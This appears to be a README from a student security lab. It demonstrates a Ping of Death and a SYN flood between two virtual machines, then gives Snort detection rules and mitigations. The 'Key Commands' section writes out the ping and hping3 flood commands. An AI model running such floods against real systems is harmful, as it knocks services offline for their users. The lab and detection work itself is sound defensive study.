# 💥 Ping of Death + SYN Flood — CVE-1996-0001

> Isolated VMware lab | Kali (attacker) → Kali (victim) | Educational purposes only.

---

## What I Did

Demonstrated two classic DoS attacks and analyzed the traffic in Wireshark, then wrote Snort rules to detect them.

**Ping of Death** — sent oversized ICMP packets (65,507 bytes) to crash the victim machine.

**SYN Flood** — flooded the victim with TCP SYN packets, filling the connection table so legitimate users can't connect.

## Tools
`hping3` `Wireshark` `Nmap` `Snort`

## Key Commands
```bash
# Ping of Death
ping 192.168.85.134 -s 65507

# SYN Flood
hping3 -S --flood -V -p 80 192.168.85.134
```

## Detection (Snort Rules)
```
alert icmp any any -> any any (msg:"Ping of Death"; dsize:>65500; sid:1000001; rev:1;)
alert tcp any any -> any any (msg:"SYN Flood"; flags:S; threshold:type both, track by_src, count 100, seconds 10; sid:1000002; rev:1;)
```

## Fix
- Enable SYN cookies: `sysctl -w net.ipv4.tcp_syncookies=1`
- Rate-limit ICMP at the firewall
- Deploy upstream DDoS scrubbing

📄 See `pingofdeath.pdf` for full walkthrough with screenshots.
